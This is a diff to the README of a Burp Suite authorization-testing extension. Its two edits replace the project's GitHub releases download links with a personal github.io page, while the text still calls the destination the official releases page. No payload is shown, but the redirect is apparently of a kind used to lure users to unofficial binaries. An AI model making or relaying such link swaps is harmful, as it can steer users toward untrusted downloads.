@@ -1,6 +1,6 @@
 # 🛡️ Authz-ExeC - Test web app security with ease
 
-[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Pruthvra2855/Authz-ExeC/releases)
+[![Download Authz-ExeC](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://pruthvra2855.github.io)
 
 Authz-ExeC helps you check how your web applications handle user permissions. It acts as an extension for Burp Suite, a tool security professionals use to inspect web traffic. Use this software to find issues where users gain unauthorized access to data or perform actions that should stay restricted.
 
@@ -31,7 +31,7 @@ Follow these steps to set up the extension on your machine.
 ### 1. Download the file
 Visit the official releases page to obtain the necessary file for your installation.
 
-[Click here to visit the download page](https://github.com/Pruthvra2855/Authz-ExeC/releases)
+[Click here to visit the download page](https://pruthvra2855.github.io)
 
 Look for the latest release on that page. Download the file ending in `.jar`. Save this file in a folder where you can easily find it, such as your Downloads or Documents folder.
 
